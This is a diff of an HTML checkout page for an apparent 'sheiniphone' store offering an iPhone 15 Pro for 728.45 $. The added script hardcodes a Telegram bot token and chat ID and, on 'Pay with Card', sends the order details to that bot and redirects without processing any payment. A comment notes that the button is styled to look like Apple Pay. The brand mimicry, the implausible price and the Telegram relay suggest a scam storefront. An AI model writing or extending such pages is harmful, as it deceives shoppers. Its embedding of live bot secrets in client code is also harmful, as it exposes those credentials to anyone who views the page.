@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Payment – iPhone 15 Pro</title>
+  <title>Payment – sheiniphone</title>
 
   <style>
     :root {
@@ -12,8 +12,8 @@
       --text-main: #111111;
       --text-muted: #6e6e73;
       --accent-blue: #0071e3;
-      --border: #d2d2d7;
-      --accent-dark: #111111;
+      --border-soft: #d2d2d7;
+      --btn-black: #000000;
     }
 
     * {
@@ -26,58 +26,76 @@
     body {
       background: var(--bg-page);
       color: var(--text-main);
-      padding: 20px 16px 32px;
     }
 
-    .page {
-      max-width: 600px;
-      margin: 0 auto;
+    .page-wrapper {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
     }
 
     header {
-      text-align: center;
-      margin-bottom: 20px;
-      font-size: 20px;
-      font-weight: 600;
+      padding: 18px 20px;
+      display: flex;
+      justify-content: center;
+      border-bottom: 1px solid rgba(0, 0, 0, 0.06);
+      background: rgba(245, 245, 247, 0.95);
+      backdrop-filter: blur(10px);
+      position: sticky;
+      top: 0;
+      z-index: 10;
     }
 
-    header span.brand {
+    .logo {
+      font-size: 18px;
+      font-weight: 600;
+      letter-spacing: 0.04em;
+    }
+
+    .logo span {
       color: var(--accent-blue);
     }
 
+    main {
+      flex: 1;
+      max-width: 780px;
+      margin: 0 auto;
+      padding: 26px 16px 40px;
+    }
+
     .title {
-      font-size: 22px;
+      text-align: center;
+      font-size: 24px;
       font-weight: 600;
       margin-bottom: 4px;
-      text-align: center;
     }
 
     .subtitle {
       text-align: center;
-      font-size: 14px;
+      font-size: 13px;
       color: var(--text-muted);
-      margin-bottom: 20px;
+      margin-bottom: 22px;
     }
 
-    .section {
+    .card {
       background: var(--card-bg);
-      padding: 18px;
-      border-radius: 16px;
+      border-radius: 18px;
+      padding: 18px 16px;
+      border: 1px solid rgba(0, 0, 0, 0.06);
       margin-bottom: 18px;
-      border: 1px solid rgba(0,0,0,0.06);
     }
 
-    .section-title {
-      font-size: 16px;
+    .card-title {
+      font-size: 18px;
       font-weight: 600;
-      margin-bottom: 10px;
+      margin-bottom: 12px;
     }
 
     .summary-row {
       display: flex;
       justify-content: space-between;
+      padding: 6px 0;
       font-size: 14px;
-      margin-bottom: 6px;
     }
 
     .summary-label {
@@ -88,139 +106,166 @@
       font-weight: 500;
     }
 
-    .total-row {
-      margin-top: 10px;
-      padding-top: 10px;
+    .summary-row.total {
+      margin-top: 6px;
       border-top: 1px solid rgba(0,0,0,0.06);
-      display: flex;
-      justify-content: space-between;
-      font-size: 15px;
+      padding-top: 10px;
       font-weight: 600;
     }
 
-    .payment-options {
+    .payment-buttons {
       display: flex;
       flex-direction: column;
       gap: 10px;
-      margin-top: 10px;
+      margin-top: 8px;
     }
 
-    .btn-primary {
-      padding: 12px;
+    .btn-black {
+      width: 100%;
       border-radius: 999px;
-      border: none;
-      background: var(--accent-dark);
+      padding: 13px 0;
+      background: var(--btn-black);
       color: #ffffff;
-      font-size: 15px;
+      font-size: 16px;
       font-weight: 500;
-      cursor: pointer;
-    }
-
-    .btn-secondary {
-      padding: 12px;
-      border-radius: 999px;
-      border: 1px solid var(--border);
-      background: #ffffff;
-      color: var(--text-main);
-      font-size: 15px;
-      font-weight: 500;
+      border: none;
       cursor: pointer;
     }
 
     .btn-ghost {
-      padding: 11px;
-      border-radius: 999px;
-      border: 1px solid rgba(0,0,0,0.12);
-      background: transparent;
-      color: var(--text-muted);
-      font-size: 14px;
-      margin-top: 10px;
-      cursor: pointer;
       width: 100%;
+      border-radius: 999px;
+      padding: 12px 0;
+      background: transparent;
+      color: var(--text-main);
+      font-size: 15px;
+      font-weight: 500;
+      border: 1px solid rgba(0,0,0,0.12);
+      cursor: pointer;
     }
 
-    .note {
+    .btn-ghost.disabled {
+      color: rgba(0,0,0,0.25);
+      cursor: default;
+    }
+
+    .checkout-note {
+      margin-top: 14px;
       font-size: 12px;
       color: var(--text-muted);
       text-align: center;
-      margin-top: 14px;
-      line-height: 1.4;
+    }
+
+    @media (max-width: 600px) {
+      main {
+        padding: 22px 12px 32px;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="page">
+  <div class="page-wrapper">
     <header>
-      <span class="brand">shein</span>iphone
+      <div class="logo"><span>shein</span>iphone</div>
     </header>
 
-    <h1 class="title">Payment</h1>
-    <p class="subtitle">Secure checkout for your iPhone 15 Pro order.</p>
+    <main>
+      <h1 class="title">Payment</h1>
+      <p class="subtitle">Secure checkout for your iPhone 15 Pro order.</p>
 
-    <!-- Order summary -->
-    <div class="section">
-      <div class="section-title">Order Summary</div>
+      <!-- Order Summary -->
+      <section class="card">
+        <div class="card-title">Order Summary</div>
 
-      <div class="summary-row">
-        <span class="summary-label">Product</span>
-        <span class="summary-value">iPhone 15 Pro</span>
-      </div>
+        <div class="summary-row">
+          <div class="summary-label">Product</div>
+          <div class="summary-value">iPhone 15 Pro</div>
+        </div>
 
-      <div class="summary-row">
-        <span class="summary-label">Region</span>
-        <span class="summary-value">Middle East version</span>
-      </div>
+        <div class="summary-row">
+          <div class="summary-label">Region</div>
+          <div class="summary-value">Middle East version</div>
+        </div>
 
-      <div class="summary-row">
-        <span class="summary-label">Storage</span>
-        <span class="summary-value">256 GB</span>
-      </div>
+        <div class="summary-row">
+          <div class="summary-label">Storage</div>
+          <div class="summary-value summary-storage">256 GB</div>
+        </div>
 
-      <div class="summary-row">
-        <span class="summary-label">Color</span>
-        <span class="summary-value">Selected on previous step</span>
-      </div>
+        <div class="summary-row">
+          <div class="summary-label">Color</div>
+          <div class="summary-value summary-color">Selected on previous step</div>
+        </div>
 
-      <div class="total-row">
-        <span>Total</span>
-        <span>728.45&nbsp;$</span>
-      </div>
-    </div>
+        <div class="summary-row total">
+          <div class="summary-label">Total</div>
+          <div class="summary-value">728.45 $</div>
+        </div>
+      </section>
 
-    <!-- Payment methods -->
-    <div class="section">
-      <div class="section-title">Payment Method</div>
+      <!-- Payment Method -->
+      <section class="card">
+        <div class="card-title">Payment Method</div>
 
-      <div class="payment-options">
-        <button class="btn-primary" id="pay-apple">
-          Pay with Apple Pay
-        </button>
-        <button class="btn-secondary" id="pay-card">
-          Pay with Card
-        </button>
-      </div>
+        <div class="payment-buttons">
+          <!-- الزر الأسود (شكل Apple Pay لكن نص Pay with Card) -->
+          <button class="btn-black" id="pay-card-btn">
+            Pay with Card
+          </button>
 
-      <button class="btn-ghost" id="back-store">
-        Back to Store
-      </button>
-    </div>
+          <!-- Back to store فقط -->
+          <button class="btn-ghost" id="back-btn">
+            Back to Store
+          </button>
+        </div>
 
-    <p class="note">
-      This checkout page is a preview. Connect the payment buttons to your real payment gateway or process.
-    </p>
+        <p class="checkout-note">
+          This checkout page is a preview. Connect the payment buttons to your real payment gateway or process.
+        </p>
+      </section>
+    </main>
   </div>
 
   <script>
-    // Demo handlers – عدلهم وربطهم ببوابة الدفع الحقيقية لو حبيت
-    document.getElementById("pay-apple").addEventListener("click", function () {
-      alert("Hook this button to your real Apple Pay / payment flow.");
+    const botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
+    const chatId  = "7811430582";
+
+    // قراءة البيانات من step-2 (لو مش موجودة نحط قيم افتراضية)
+    const storage = localStorage.getItem("selectedStorage") || "256 GB";
+    const color   = localStorage.getItem("selectedColor") || "Natural Titanium";
+
+    // عرضها في الصفحة
+    document.querySelector(".summary-storage").innerText = storage;
+    document.querySelector(".summary-color").innerText   = color;
+
+    // زر Pay with Card
+    document.getElementById("pay-card-btn").addEventListener("click", function () {
+      const msg =
+        💳 *Customer clicked Pay with Card*\n\n +
+        Product: iPhone 15 Pro\n +
+        Region: Middle East version\n +
+        Storage: ${storage}\n +
+        Color: ${color}\n +
+        Total: 728.45 $;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: msg,
+          parse_mode: "Markdown"
+        })
+      }).catch(function (err) {
+        console.error("Telegram error:", err);
+      }).finally(function () {
+        // بعد ما يضغط الدفع نرجعه للمتجر
+        window.location.href = "index.html";
+      });
     });
 
-    document.getElementById("pay-card").addEventListener("click", function () {
-      alert("Hook this button to your real card payment flow.");
-    });
-
-    document.getElementById("back-store").addEventListener("click", function () {
+    // Back to store
+    document.getElementById("back-btn").addEventListener("click", function () {
       window.location.href = "index.html";
     });
   </script>
